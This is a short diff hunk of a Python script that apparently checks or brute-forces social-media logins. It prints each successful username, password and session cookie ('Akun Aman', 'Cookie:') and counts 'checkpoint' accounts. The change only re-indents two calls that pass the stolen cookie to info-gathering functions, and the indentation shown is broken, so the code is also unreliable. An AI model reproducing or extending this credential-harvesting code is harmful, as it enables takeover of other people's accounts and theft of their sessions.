@@ -532,8 +532,8 @@ def log_hasil(user, pasw):
         coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
     if self.satua==True:print(f"\r{H}[OK] {self.user}|{self.pw}|{coki}{P}        ",end="")
     print(f"\r{H}[√] Akun Aman{P}\n[{K}={P}] Cookie: {BM}{coki}{P}\n",end="")
-        self.get_info(session,coki)
-        self.cek_apk(session,coki)
+    self.get_info(session,coki)
+    self.cek_apk(session,coki)
     elif "checkpoint" in session.cookies.get_dict():cp+=1
         title=re.findall("\<title>(.*?)<\/title>",str(response))
         link2=response.find("form",{"method":"post"})
